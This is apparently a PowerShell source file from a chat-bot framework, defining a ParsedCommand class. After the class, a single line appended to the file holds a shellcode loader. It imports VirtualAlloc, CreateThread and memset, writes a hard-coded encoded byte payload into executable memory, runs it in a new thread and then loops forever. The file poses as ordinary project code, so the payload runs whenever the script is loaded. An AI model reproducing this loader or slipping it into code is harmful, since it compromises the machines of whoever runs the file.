
class ParsedCommand {
    [string]$CommandString
    [string]$Plugin = $null
    [string]$Command = $null
    [string]$Version = $null
    [hashtable]$NamedParameters = @{}
    [System.Collections.ArrayList]$PositionalParameters = (New-Object System.Collections.ArrayList)
    [datetime]$Time = (Get-Date).ToUniversalTime()
    [string]$From = $null
    [string]$FromName = $null
    [hashtable]$CallingUserInfo = @{}
    [string]$To = $null
    [string]$ToName = $null
    [Message]$OriginalMessage

    [pscustomobject]Summarize() {
        $o = $this | Select-Object -Property * -ExcludeProperty NamedParameters
        if ($this.Plugin -eq 'Builtin') {
            $np = $this.NamedParameters.GetEnumerator() | Where-Object {$_.Name -ne 'Bot'}
            $o | Add-Member -MemberType NoteProperty -Name NamedParameters -Value $np
        } else {
            $o | Add-Member -MemberType NoteProperty -Name NamedParameters -Value $this.NamedParameters
        }
        return [pscustomobject]$o
    }
}

$yuy = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $yuy -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0xed,0x31,0x1b,0xa1,0xd9,0xeb,0xd9,0x74,0x24,0xf4,0x5d,0x2b,0xc9,0xb1,0x53,0x83,0xc5,0x04,0x31,0x45,0x11,0x03,0x45,0x11,0xe2,0x18,0xcd,0xf3,0x23,0xe2,0x2e,0x04,0x44,0x6b,0xcb,0x35,0x44,0x0f,0x9f,0x66,0x74,0x44,0xcd,0x8a,0xff,0x08,0xe6,0x19,0x8d,0x84,0x09,0xa9,0x38,0xf2,0x24,0x2a,0x10,0xc6,0x27,0xa8,0x6b,0x1a,0x88,0x91,0xa3,0x6f,0xc9,0xd6,0xde,0x9d,0x9b,0x8f,0x95,0x33,0x0c,0xbb,0xe0,0x8f,0xa7,0xf7,0xe5,0x97,0x54,0x4f,0x07,0xb6,0xca,0xdb,0x5e,0x18,0xec,0x08,0xeb,0x11,0xf6,0x4d,0xd6,0xe8,0x8d,0xa6,0xac,0xeb,0x47,0xf7,0x4d,0x47,0xa6,0x37,0xbc,0x96,0xee,0xf0,0x5f,0xed,0x06,0x03,0xdd,0xf5,0xdc,0x79,0x39,0x70,0xc7,0xda,0xca,0x22,0x23,0xda,0x1f,0xb4,0xa0,0xd0,0xd4,0xb3,0xef,0xf4,0xeb,0x10,0x84,0x01,0x67,0x97,0x4b,0x80,0x33,0xb3,0x4f,0xc8,0xe0,0xda,0xd6,0xb4,0x47,0xe3,0x09,0x17,0x37,0x41,0x41,0xba,0x2c,0xf8,0x08,0xd3,0xdc,0x67,0xc7,0x23,0x49,0x10,0x4e,0x4a,0xe0,0x8a,0xf8,0xde,0x85,0x14,0xfe,0x21,0xbc,0x69,0xdb,0x8d,0x6c,0xda,0x88,0x62,0xfb,0xe6,0x78,0xfc,0x5c,0xe9,0x50,0xad,0xf1,0x7f,0x58,0x01,0xa5,0x17,0x1a,0xa3,0x49,0xe7,0x4a,0xd3,0x49,0xe7,0x8a,0x0b,0x3c,0xd3,0xbb,0x1b,0xf9,0x1b,0xec,0xf3,0xae,0x92,0x93,0xc2,0xae,0x71,0x22,0x0c,0x03,0x11,0x35,0x93,0xc4,0x65,0x66,0xc0,0x57,0x32,0xda,0xb0,0x3f,0x57,0x89,0x12,0xfb,0x58,0xe7,0xfd,0x91,0xac,0x57,0x51,0x35,0xe3,0x34,0x03,0xd1,0x2e,0xbd,0xb3,0x5a,0xcf,0x14,0x46,0x5c,0x5a,0x9d,0x06,0x28,0x49,0xc9,0x68,0x67,0x33,0x5c,0x76,0x5d,0x59,0x21,0xe0,0x5e,0x8d,0xa1,0xf0,0x36,0xad,0xa1,0xb0,0xc6,0xfe,0xc9,0x68,0x63,0x53,0xef,0x76,0xbe,0xc0,0xbc,0xdb,0xc8,0x01,0x15,0xb4,0xca,0xed,0x9a,0x44,0x98,0xbb,0xf2,0x56,0x88,0xca,0xe1,0xa8,0x61,0x49,0x25,0x22,0x47,0xda,0xa1,0xca,0x94,0x59,0x6d,0xb9,0xff,0x39,0xad,0x1d,0xe8,0x30,0xce,0x5d,0x17,0x26,0x5e,0xc1,0x9b,0xc2,0xd2,0x6c,0x2a,0x6f,0x3d,0x1c,0xab,0x1b,0x24,0x91,0x65,0x8d,0xc3,0x21,0x7a;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$G8t=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($G8t.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$G8t,0,0,0);for (;;){Start-sleep 60};

